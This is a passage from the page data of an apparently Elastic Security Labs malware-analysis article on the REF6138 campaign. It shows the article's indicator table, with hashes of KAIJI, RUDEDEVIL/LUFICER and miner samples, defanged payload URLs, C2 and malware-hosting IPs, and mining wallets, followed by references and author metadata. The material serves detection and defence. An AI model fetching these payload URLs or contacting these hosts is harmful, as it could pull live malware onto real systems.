Stager\"})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{children:\"1cdfb522acb1ad0745a4b88f072e40bf9aa113b63030fe002728bac50a46ae79\"}),(0,n.jsx)(e.td,{children:\"SHA-256\"}),(0,n.jsx)(e.td,{children:\"linux_386\"}),(0,n.jsx)(e.td,{children:\"KAIJI x86\"})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{children:\"d0ef2f020082556884361914114429ed82611ef8de09d878431745ccd07c06d8\"}),(0,n.jsx)(e.td,{children:\"SHA-256\"}),(0,n.jsx)(e.td,{children:\"linux_amd64\"}),(0,n.jsx)(e.td,{children:\"KAIJI x64\"})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{children:\"ad36cf59b5eb08799a50e9aece6f12cdfe8620062606ac6684d3b4509acc681b\"}),(0,n.jsx)(e.td,{children:\"SHA-256\"}),(0,n.jsx)(e.td,{children:\"linux_arm5\"}),(0,n.jsx)(e.td,{children:\"KAIJI ARM5\"})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{children:\"792a84a5bc8530285e2f6eb997054edb3d43460a99a089468e2cf81b5fd5cde6\"}),(0,n.jsx)(e.td,{children:\"SHA-256\"}),(0,n.jsx)(e.td,{children:\"linux_arm6\"}),(0,n.jsx)(e.td,{children:\"KAIJI ARM6\"})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{children:\"e19fb249db323d2388e91f92ff0c8a7a169caf34c3bdaf4d3544ce6bfb8b88b4\"}),(0,n.jsx)(e.td,{children:\"SHA-256\"}),(0,n.jsx)(e.td,{children:\"linux_arm64\"}),(0,n.jsx)(e.td,{children:\"KAIJI ARM64\"})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{children:\"3847c06f95dd92ec482212116408286986bb4b711e27def446fb4a524611b745\"}),(0,n.jsx)(e.td,{children:\"SHA-256\"}),(0,n.jsx)(e.td,{children:\"linux_arm7\"}),(0,n.jsx)(e.td,{children:\"KAIJI ARM7\"})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{children:\"fffee23324813743b8660282ccd745daa6fb058f2bf84b9960f70d888cd33ba0\"}),(0,n.jsx)(e.td,{children:\"SHA-256\"}),(0,n.jsx)(e.td,{children:\"linux_mips\"}),(0,n.jsx)(e.td,{children:\"KAIJI MIPS\"})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{children:\"6d40b58e97c7b4c34f7b5bdac88f46e943e25faa887e0e6ce5f2855008e83f55\"}),(0,n.jsx)(e.td,{children:\"SHA-256\"}),(0,n.jsx)(e.td,{children:\"linux_mips64\"}),(0,n.jsx)(e.td,{children:\"KAIJI MIPS64\"})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{children:\"0c3442b8c49844a1ee41705a9e4a710ae3c7cde76c69c2eab733366b2aa34814\"}),(0,n.jsx)(e.td,{children:\"SHA-256\"}),(0,n.jsx)(e.td,{children:\"linux_mips64el\"}),(0,n.jsx)(e.td,{children:\"KAIJI MIPS64 little-endian\"})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{children:\"310973f6f186947cb7cff0e7b46b4645acdd71e90104f334caa88a4fa8ad9988\"}),(0,n.jsx)(e.td,{children:\"SHA-256\"}),(0,n.jsx)(e.td,{children:\"linux_mips_softfloat\"}),(0,n.jsx)(e.td,{children:\"KAIJI MIPS softfloat\"})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{children:\"0d24a2e7da52bad03b0bda45c8435a29c4e1c9b483e425ae71b79fd122598527\"}),(0,n.jsx)(e.td,{children:\"SHA-256\"}),(0,n.jsx)(e.td,{children:\"linux_mipsel\"}),(0,n.jsx)(e.td,{children:\"KAIJI MIPS little-endian\"})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{children:\"36fc8eef2e1574e00ba3cf9e2267d4d295f6e9f138474e3bd85eb4d215f63196\"}),(0,n.jsx)(e.td,{children:\"SHA-256\"}),(0,n.jsx)(e.td,{children:\"linux_mipsel_softfloat\"}),(0,n.jsx)(e.td,{children:\"KAIJI MIPS little-endian softfloat\"})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{children:\"3c25a4406787cc5089e83e00350e49eb9f192d03d69e7a61b780b6828db1344f\"}),(0,n.jsx)(e.td,{children:\"SHA-256\"}),(0,n.jsx)(e.td,{children:\"linux_ppc64\"}),(0,n.jsx)(e.td,{children:\"KAIJI PPC64\"})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{children:\"7c16149db7766c6fd89f28031aa123408228f045e90aa03828c02562d9f9d1d7\"}),(0,n.jsx)(e.td,{children:\"SHA-256\"}),(0,n.jsx)(e.td,{children:\"linux_ppc64el\"}),(0,n.jsx)(e.td,{children:\"KAIJI PPC64 little-endian\"})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{children:\"09f935acbac36d224acfb809ad82c475d53d74ab505f057f5ac40611d7c3dbe7\"}),(0,n.jsx)(e.td,{children:\"SHA-256\"}),(0,n.jsx)(e.td,{children:\"l64_v0\"}),(0,n.jsx)(e.td,{children:\"RUDEDEVIL/LUFICER x64 version 0\"})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{children:\"ea0068702ea65725700b1dad73affe68cf29705c826d12a497dccf92d3cded46\"}),(0,n.jsx)(e.td,{children:\"SHA-256\"}),(0,n.jsx)(e.td,{children:\"l64_v1\"}),(0,n.jsx)(e.td,{children:\"RUDEDEVIL/LUFICER x64 version 1\"})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{children:\"160f232566968ade54ee875def81fc4ca69e5507faae0fceb5bef6139346496a\"}),(0,n.jsx)(e.td,{children:\"SHA-256\"}),(0,n.jsx)(e.td,{children:\"l64_v2\"}),(0,n.jsx)(e.td,{children:\"RUDEDEVIL/LUFICER x64 version 2\"})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{children:\"89b60cedc3a4efb02ceaf629d6675ec9541addae4689489f3ab8ec7741ec8055\"}),(0,n.jsx)(e.td,{children:\"SHA-256\"}),(0,n.jsx)(e.td,{children:\"l64_v3\"}),(0,n.jsx)(e.td,{children:\"RUDEDEVIL/LUFICER x64 version 3\"})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{children:\"20899c5e2ecd94b9e0a8d1af0114332c408fb65a6eb3837d4afee000b2a0941b\"}),(0,n.jsx)(e.td,{children:\"SHA-256\"}),(0,n.jsx)(e.td,{children:\"l86_v0\"}),(0,n.jsx)(e.td,{children:\"RUDEDEVIL/LUFICER x86 version 0\"})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{children:\"728dce11ffd7eb35f80553d0b2bc82191fe9ff8f0d0750fcca04d0e77d5be28c\"}),(0,n.jsx)(e.td,{children:\"SHA-256\"}),(0,n.jsx)(e.td,{children:\"l86_v1\"}),(0,n.jsx)(e.td,{children:\"RUDEDEVIL/LUFICER x86 version 1\"})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{children:\"47ceca049bfcb894c9a229e7234e8146d8aeda6edd1629bc4822ab826b5b9a40\"}),(0,n.jsx)(e.td,{children:\"SHA-256\"}),(0,n.jsx)(e.td,{children:\"l86_v2\"}),(0,n.jsx)(e.td,{children:\"RUDEDEVIL/LUFICER x86 version 2\"})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{children:\"e89f4073490e48aa03ec0256d0bfa6cf9c9ac6feb271a23cb6bc571170d1bcb5\"}),(0,n.jsx)(e.td,{children:\"SHA-256\"}),(0,n.jsx)(e.td,{children:\"l86_v3\"}),(0,n.jsx)(e.td,{children:\"RUDEDEVIL/LUFICER x86 version 3\"})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{children:\"d6350d8a664b3585108ee2b6f04f031d478e97a53962786b18e4780a3ca3da60\"}),(0,n.jsx)(e.td,{children:\"SHA-256\"}),(0,n.jsx)(e.td,{children:\"hjvhg.exe\"}),(0,n.jsx)(e.td,{children:\"Miner\"})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{children:\"54a5c82e4c68c399f56f0af6bde9fb797122239f0ebb8bcdb302e7c4fb02e1de\"}),(0,n.jsx)(e.td,{children:\"SHA-256\"}),(0,n.jsx)(e.td,{children:\"mvhhvcp3.exe\"}),(0,n.jsx)(e.td,{children:\"DONUT LOADER\"})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{children:\"9e32be17b25d3a6c00ebbfd03114a0947361b4eaf4b0e9d6349cbb95350bf976\"}),(0,n.jsx)(e.td,{children:\"SHA-256\"}),(0,n.jsx)(e.td,{children:\"vdfgb.exe\"}),(0,n.jsx)(e.td,{children:\"Miner\"})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{children:(0,n.jsx)(e.a,{href:\"http://gcp.pagaelrescate%5B.%5Dcom:8080/ifindyou\",rel:\"nofollow\",children:\"http://gcp.pagaelrescate[.]com:8080/ifindyou\"})}),(0,n.jsx)(e.td,{children:\"url\"}),(0,n.jsx)(e.td,{children:\"ifindyou.sh\"}),(0,n.jsx)(e.td,{children:\"Stage 1\"})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{children:(0,n.jsx)(e.a,{href:\"http://gcp.pagaelrescate%5B.%5Dcom:8080/cycnet\",rel:\"nofollow\",children:\"http://gcp.pagaelrescate[.]com:8080/cycnet\"})}),(0,n.jsx)(e.td,{children:\"url\"}),(0,n.jsx)(e.td,{children:\"cycnet.sh\"}),(0,n.jsx)(e.td,{children:\"Stage 2\"})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{children:(0,n.jsx)(e.a,{href:\"http://gcp.pagaelrescate%5B.%5Dcom:8080/testslot/enviador_slot\",rel:\"nofollow\",children:\"http://gcp.pagaelrescate[.]com:8080/testslot/enviador_slot\"})}),(0,n.jsx)(e.td,{children:\"url\"}),(0,n.jsx)(e.td,{children:\"Enviador_slot.py\"}),(0,n.jsx)(e.td,{children:\"Stage 3\"})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{children:(0,n.jsx)(e.a,{href:\"http://gcp.pagaelrescate%5B.%5Dcom:8080/t9r/SystemdXC\",rel:\"nofollow\",children:\"http://gcp.pagaelrescate[.]com:8080/t9r/SystemdXC\"})}),(0,n.jsx)(e.td,{children:\"url\"}),(0,n.jsx)(e.td,{children:\"SystemdXC\"}),(0,n.jsx)(e.td,{children:\"XMRIG\"})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{children:(0,n.jsx)(e.a,{href:\"http://38.54.125%5B.%5D192:8080/nginx-rc\",rel:\"nofollow\",children:\"http://38.54.125[.]192:8080/nginx-rc\"})}),(0,n.jsx)(e.td,{children:\"url\"}),(0,n.jsx)(e.td,{children:\"nginx-rc\"}),(0,n.jsx)(e.td,{children:\"LIGOLO-NG\"})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{children:(0,n.jsx)(e.a,{href:\"http://62.72.22%5B.%5D91/apache2\",rel:\"nofollow\",children:\"http://62.72.22[.]91/apache2\"})}),(0,n.jsx)(e.td,{children:\"url\"}),(0,n.jsx)(e.td,{children:\"apache2\"}),(0,n.jsx)(e.td,{children:\"Custom Malware\"})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{children:(0,n.jsx)(e.a,{href:\"http://62.72.22%5B.%5D91/apache2v86\",rel:\"nofollow\",children:\"http://62.72.22[.]91/apache2v86\"})}),(0,n.jsx)(e.td,{children:\"url\"}),(0,n.jsx)(e.td,{children:\"apache2v86\"}),(0,n.jsx)(e.td,{children:\"Custom Malware\"})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{children:(0,n.jsx)(e.a,{href:\"http://91.92.241%5B.%5D103:8002/gk.php\",rel:\"nofollow\",children:\"http://91.92.241[.]103:8002/gk.php\"})}),(0,n.jsx)(e.td,{children:\"url\"}),(0,n.jsx)(e.td,{children:\"gk.php\"}),(0,n.jsx)(e.td,{children:\"PHP Backdoor\"})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{children:(0,n.jsx)(e.a,{href:\"http://hfs.t1linux%5B.%5Dcom:7845/scdsshfk\",rel:\"nofollow\",children:\"http://hfs.t1linux[.]com:7845/scdsshfk\"})}),(0,n.jsx)(e.td,{children:\"url\"}),(0,n.jsx)(e.td,{children:\"scdsshfk\"}),(0,n.jsx)(e.td,{children:\"XMRIG\"})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{children:\"gcp.pagaelrescate[.]com\"}),(0,n.jsx)(e.td,{children:\"domain-name\"}),(0,n.jsx)(e.td,{}),(0,n.jsx)(e.td,{children:\"REF Hosting domain\"})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{children:\"nishabii[.]xyz\"}),(0,n.jsx)(e.td,{children:\"domain-name\"}),(0,n.jsx)(e.td,{}),(0,n.jsx)(e.td,{children:\"RUDEDEVIL C2\"})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{children:\"3.147.53[.]183\"}),(0,n.jsx)(e.td,{children:\"ipv4-addr\"}),(0,n.jsx)(e.td,{}),(0,n.jsx)(e.td,{children:\"Python Reverse Shell C2\"})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{children:\"38.54.125[.]192\"}),(0,n.jsx)(e.td,{children:\"ipv4-addr\"}),(0,n.jsx)(e.td,{}),(0,n.jsx)(e.td,{children:\"C2 Server\"})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{children:\"107.178.101[.]245\"}),(0,n.jsx)(e.td,{children:\"ipv4-addr\"}),(0,n.jsx)(e.td,{}),(0,n.jsx)(e.td,{children:\"Malware File Server (Rejetto)\"})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{children:\"62.72.22[.]91\"}),(0,n.jsx)(e.td,{children:\"ipv4-addr\"}),(0,n.jsx)(e.td,{}),(0,n.jsx)(e.td,{children:\"Server Hosting Malware\"})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{children:\"91.92.241[.]103\"}),(0,n.jsx)(e.td,{children:\"ipv4-addr\"}),(0,n.jsx)(e.td,{}),(0,n.jsx)(e.td,{children:\"C2 Server\"})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{children:\"61.160.194[.]160\"}),(0,n.jsx)(e.td,{children:\"ipv4-addr\"}),(0,n.jsx)(e.td,{}),(0,n.jsx)(e.td,{children:\"Server Hosting Malware\"})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{children:\"41qBGWTRXUoUMGXsr78Aie3LYCBSDGZyaQeceMxn11qi9av1adZqsVWCrUwhhwqrt72qTzMbweeqMbA89mnFepja9XERfHL\"}),(0,n.jsx)(e.td,{children:\"XMR Wallet\"}),(0,n.jsx)(e.td,{}),(0,n.jsx)(e.td,{children:\"RUDEDEVIL/LUFICER mining wallet\"})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{children:\"42CJPfp1jJ6PXv4cbjXbBRMhp9YUZsXH6V5kEvp7XzNGKLnuTNZQVU9bhxsqBEMstvDwymNSysietQ5VubezYfoq4fT4Ptc\"}),(0,n.jsx)(e.td,{children:\"XMR Wallet\"}),(0,n.jsx)(e.td,{}),(0,n.jsx)(e.td,{children:\"RUDEDEVIL/LUFICER mining wallet\"})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{children:\"1CSUkd5FZMis5NDauKLDkcpvvgV1zrBCBz\"}),(0,n.jsx)(e.td,{children:\"BTC Wallet\"}),(0,n.jsx)(e.td,{}),(0,n.jsx)(e.td,{children:\"XMRIG mining wallet\"})]})]})]})}),`\n`,(0,n.jsx)(e.h2,{id:\"references\",children:\"References\"}),`\n`,(0,n.jsx)(e.p,{children:\"The following were referenced throughout the above research:\"}),`\n`,(0,n.jsxs)(e.ul,{children:[`\n`,(0,n.jsx)(e.li,{children:(0,n.jsx)(e.a,{href:\"https://www.trendmicro.com/en_us/research/20/f/xorddos-kaiji-botnet-malware-variants-target-exposed-docker-servers.html\",rel:\"nofollow\",children:\"https://www.trendmicro.com/en_us/research/20/f/xorddos-kaiji-botnet-malware-variants-target-exposed-docker-servers.html\"})}),`\n`,(0,n.jsx)(e.li,{children:(0,n.jsx)(e.a,{href:\"https://blog.lumen.com/chaos-is-a-go-based-swiss-army-knife-of-malware/\",rel:\"nofollow\",children:\"https://blog.lumen.com/chaos-is-a-go-based-swiss-army-knife-of-malware/\"})}),`\n`,(0,n.jsx)(e.li,{children:(0,n.jsx)(e.a,{href:\"https://www.fortinet.com/blog/threat-research/multiple-threats-target-adobe-coldfusion-vulnerabilities\",rel:\"nofollow\",children:\"https://www.fortinet.com/blog/threat-research/multiple-threats-target-adobe-coldfusion-vulnerabilities\"})}),`\n`,(0,n.jsx)(e.li,{children:(0,n.jsx)(e.a,{href:\"https://www.aquasec.com/blog/lucifer-ddos-botnet-malware-is-targeting-apache-big-data-stack/\",rel:\"nofollow\",children:\"https://www.aquasec.com/blog/lucifer-ddos-botnet-malware-is-targeting-apache-big-data-stack/\"})}),`\n`,(0,n.jsx)(e.li,{children:(0,n.jsx)(e.a,{href:\"https://github.com/hackerschoice/gsocket\",rel:\"nofollow\",children:\"https://github.com/hackerschoice/gsocket\"})}),`\n`]})]})}function S(t={}){let{wrapper:e}=t.components||{};return e?(0,n.jsx)(e,Object.assign({},t,{children:(0,n.jsx)(l,t)})):l(t)}var k=S;return y(T);})();\n;return Component;"},"_id":"articles/betting-on-bots.mdx","_raw":{"sourceFilePath":"articles/betting-on-bots.mdx","sourceFileName":"betting-on-bots.mdx","sourceFileDir":"articles","contentType":"mdx","flattenedPath":"articles/betting-on-bots"},"type":"Article","imageUrl":"/assets/images/betting-on-bots/betting-on-bots.jpg","readingTime":"80 min read","series":"","url":"/betting-on-bots","headings":[{"level":2,"title":"Introduction","href":"#introduction"},{"level":2,"title":"Execution flow","href":"#execution-flow"},{"level":3,"title":"Initial access","href":"#initial-access"},{"level":3,"title":"Fileserver","href":"#fileserver"},{"level":3,"title":"RUDEDEVIL/LUCIFER","href":"#rudedevillucifer"},{"level":3,"title":"Thread Management in the Malware","href":"#thread-management-in-the-malware"},{"level":4,"title":"Understanding the KillPid Function","href":"#understanding-the-killpid-function"},{"level":4,"title":"Understanding the Get_Net_Messages Function","href":"#understanding-the-get_net_messages-function"},{"level":4,"title":"Understanding the Get_Cpu_Message Function","href":"#understanding-the-get_cpu_message-function"},{"level":4,"title":"Understanding the Send_Host_Message Function","href":"#understanding-the-send_host_message-function"},{"level":3,"title":"Connecting to the Command-and-Control (C2) Server","href":"#connecting-to-the-command-and-control-c2-server"},{"level":4,"title":"Understanding the ConnectServer Function","href":"#understanding-the-connectserver-function"},{"level":4,"title":"Command-and-Control (C2) Commands","href":"#command-and-control-c2-commands"},{"level":3,"title":"Variants of RUDEDEVIL Malware and XMRIG Configuration","href":"#variants-of-rudedevil-malware-and-xmrig-configuration"},{"level":2,"title":"GSOCKET","href":"#gsocket"},{"level":3,"title":"Post compromise dwell time","href":"#post-compromise-dwell-time"},{"level":3,"title":"KAIJI malware: a comparison to previous samples","href":"#kaiji-malware-a-comparison-to-previous-samples"},{"level":2,"title":"The saga continues","href":"#the-saga-continues"},{"level":3,"title":"Custom built binaries","href":"#custom-built-binaries"},{"level":3,"title":"Additional reconnaissance ","href":"#additional-reconnaissance-"},{"level":3,"title":"Mining activities","href":"#mining-activities"},{"level":4,"title":"Understanding the `obteneruid` Function","href":"#understanding-the-obteneruid-function"},{"level":4,"title":"Understanding the `enviardatos` Function","href":"#understanding-the-enviardatos-function"},{"level":4,"title":"Understanding the `hacerjugada` Function","href":"#understanding-the-hacerjugada-function"},{"level":4,"title":"Understanding the `completarbono` Function","href":"#understanding-the-completarbono-function"},{"level":4,"title":"Likely Used for Testing Purposes","href":"#likely-used-for-testing-purposes"},{"level":2,"title":"REF6138 through MITRE ATT\u0026CK","href":"#ref6138-through-mitre-attck"},{"level":2,"title":"**Detecting REF6138**","href":"#detecting-ref6138"},{"level":3,"title":"Detection","href":"#detection"},{"level":3,"title":"Prevention","href":"#prevention"},{"level":3,"title":"Hunting queries in Elastic","href":"#hunting-queries-in-elastic"},{"level":4,"title":"EQL queries","href":"#eql-queries"},{"level":4,"title":"YARA","href":"#yara"},{"level":3,"title":"Defensive recommendations","href":"#defensive-recommendations"},{"level":2,"title":"Observations","href":"#observations"},{"level":2,"title":"References","href":"#references"}],"author":[{"title":"Remco Sprooten","slug":"remco-sprooten","body":{"raw":"","code":"var Component=(()=\u003e{var x=Object.create;var s=Object.defineProperty;var f=Object.getOwnPropertyDescriptor;var p=Object.getOwnPropertyNames;var _=Object.getPrototypeOf,g=Object.prototype.hasOwnProperty;var j=(t,e)=\u003e()=\u003e(e||t((e={exports:{}}).exports,e),e.exports),l=(t,e)=\u003e{for(var n in e)s(t,n,{get:e[n],enumerable:!0})},c=(t,e,n,a)=\u003e{if(e\u0026\u0026typeof e==\"object\"||typeof e==\"function\")for(let r of p(e))!g.call(t,r)\u0026\u0026r!==n\u0026\u0026s(t,r,{get:()=\u003ee[r],enumerable:!(a=f(e,r))||a.enumerable});return t};var d=(t,e,n)=\u003e(n=t!=null?x(_(t)):{},c(e||!t||!t.__esModule?s(n,\"default\",{value:t,enumerable:!0}):n,t)),M=t=\u003ec(s({},\"__esModule\",{value:!0}),t);var u=j((h,m)=\u003e{m.exports=_jsx_runtime});var X={};l(X,{default:()=\u003eF,frontmatter:()=\u003eC});var o=d(u()),C={title:\"Remco Sprooten\",slug:\"remco-sprooten\"};function i(t){return(0,o.jsx)(o.Fragment,{})}function D(t={}){let{wrapper:e}=t.components||{};return e?(0,o.jsx)(e,Object.assign({},t,{children:(0,o.jsx)(i,t)})):i(t)}var F=D;return M(X);})();\n;return Component;"},"_id":"authors/remco-sprooten.mdx","_raw":{"sourceFilePath":"authors/remco-sprooten.mdx","sourceFileName":"remco-sprooten.mdx","sourceFileDir":"authors","contentType":"mdx","flattenedPath":"authors/remco-sprooten"},"type":"Author","imageUrl":"","url":"/authors/remco-sprooten"},{"title":"Ruben Groenewoud","slug":"ruben-groenewoud","description":"Security Research Engineer, Elastic","body":{"raw":"","code":"var Component=(()=\u003e{var x=Object.create;var s=Object.defineProperty;var d=Object.getOwnPropertyDescriptor;var g=Object.getOwnPropertyNames;var f=Object.getPrototypeOf,l=Object.prototype.hasOwnProperty;var _=(e,t)=\u003e()=\u003e(t||e((t={exports:{}}).exports,t),t.exports),j=(e,t)=\u003e{for(var n in t)s(e,n,{get:t[n],enumerable:!0})},a=(e,t,n,u)=\u003e{if(t\u0026\u0026typeof t==\"object\"||typeof t==\"function\")for(let o of g(t))!l.call(e,o)\u0026\u0026o!==n\u0026\u0026s(e,o,{get:()=\u003et[o],enumerable:!(u=d(t,o))||u.enumerable});return e};var p=(e,t,n)=\u003e(n=e!=null?x(f(e)):{},a(t||!e||!e.__esModule?s(n,\"default\",{value:e,enumerable:!0}):n,e)),b=e=\u003ea(s({},\"__esModule\",{value:!0}),e);var i=_((D,c)=\u003e{c.exports=_jsx_runtime});var y={};j(y,{default:()=\u003eh,frontmatter:()=\u003ew});var r=p(i()),w={title:\"Ruben Groenewoud\",description:\"Security Research Engineer, Elastic\",slug:\"ruben-groenewoud\"};function m(e){return(0,r.jsx)(r.Fragment,{})}function M(e={}){let{wrapper:t}=e.components||{};return t?(0,r.jsx)(t,Object.assign({},e,{children:(0,r.jsx)(m,e)})):m(e)}var h=M;return b(y);})();\n;return Component;"},"_id":"authors/ruben-groenewoud.mdx","_raw":{"sourceFilePath":"authors/ruben-groenewoud.mdx","sourceFileName":"ruben-groenewoud.mdx","sourceFileDir":"authors","contentType":"mdx","flattenedPath":"authors/ruben-groenewoud"},"type":"Author","imageUrl":"","url":"/authors/ruben-groenewoud"}],"category":[{"title":"Malware analysis","slug":"malware-analysis","body":{"raw":"","code":"var Component=(()=\u003e{var u=Object.create;var s=Object.defineProperty;var x=Object.getOwnPropertyDescriptor;var f=Object.getOwnPropertyNames;var _=Object.getPrototypeOf,g=Object.prototype.hasOwnProperty;var j=(t,n)=\u003e()=\u003e(n||t((n={exports:{}}).exports,n),n.exports),M=(t,n)=\u003e{for(var e in n)s(t,e,{get:n[e],enumerable:!0})},i=(t,n,e,o)=\u003e{if(n\u0026\u0026typeof n==\"object\"||typeof n==\"function\")for(let r of f(n))!g.call(t,r)\u0026\u0026r!==e\u0026\u0026s(t,r,{get:()=\u003en[r],enumerable:!(o=x(n,r))||o.enumerable});return t};var d=(t,n,e)=\u003e(e=t!=null?u(_(t)):{},i(n||!t||!t.__esModule?s(e,\"default\",{value:t,enumerable:!0}):e,t)),p=t=\u003ei(s({},\"__esModule\",{value:!0}),t);var l=j((X,c)=\u003e{c.exports=_jsx_runtime});var D={};M(D,{default:()=\u003eC,frontmatter:()=\u003ew});var a=d(l()),w={title:\"Malware analysis\",slug:\"malware-analysis\"};function m(t){return(0,a.jsx)(a.Fragment,{})}function y(t={}){let{wrapper:n}=t.components||{};return n?(0,a.jsx)(n,Object.assign({},t,{children:(0,a.jsx)(m,t)})):m(t)}var C=y;return p(D);})();\n;return Component;"},"_id":"categories/malware-analysis.mdx","_raw":{"sourceFilePath":"categories/malware-analysis.mdx","sourceFileName":"malware-analysis.mdx","sourceFileDir":"categories","contentType":"mdx","flattenedPath":"categories/malware-analysis"},"type":"Category","url":"/categories/malware-analysis"},{"title":"Attack pattern","slug":"attack-pattern","body":{"raw":"","code":"var Component=(()=\u003e{var x=Object.create;var o=Object.defineProperty;var f=Object.getOwnPropertyDescriptor;var p=Object.getOwnPropertyNames;var _=Object.getPrototypeOf,g=Object.prototype.hasOwnProperty;var j=(t,n)=\u003e()=\u003e(n||t((n={exports:{}}).exports,n),n.exports),l=(t,n)=\u003e{for(var e in n)o(t,e,{get:n[e],enumerable:!0})},s=(t,n,e,c)=\u003e{if(n\u0026\u0026typeof n==\"object\"||typeof n==\"function\")for(let a of p(n))!g.call(t,a)\u0026\u0026a!==e\u0026\u0026o(t,a,{get:()=\u003en[a],enumerable:!(c=f(n,a))||c.enumerable});return t};var d=(t,n,e)=\u003e(e=t!=null?x(_(t)):{},s(n||!t||!t.__esModule?o(e,\"default\",{value:t,enumerable:!0}):e,t)),M=t=\u003es(o({},\"__esModule\",{value:!0}),t);var i=j((b,u)=\u003e{u.exports=_jsx_runtime});var F={};l(F,{default:()=\u003eD,frontmatter:()=\u003ek});var r=d(i()),k={title:\"Attack pattern\",slug:\"attack-pattern\"};function m(t){return(0,r.jsx)(r.Fragment,{})}function C(t={}){let{wrapper:n}=t.components||{};return n?(0,r.jsx)(n,Object.assign({},t,{children:(0,r.jsx)(m,t)})):m(t)}var D=C;return M(F);})();\n;return Component;"},"_id":"categories/attack-pattern.mdx","_raw":{"sourceFilePath":"categories/attack-pattern.mdx","sourceFileName":"attack-pattern.mdx","sourceFileDir":"categories","contentType":"mdx","flattenedPath":"categories/attack-pattern"},"type":"Category","url":"/categories/attack-pattern"}]},"seriesArticles":null},"__N_SSG":true},"page":"/[slug]","query":{"slug":"betting-on-bots"},"buildId":"dGrrQfBbQkqaleQ_11aBK","assetPrefix":"/security-labs","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>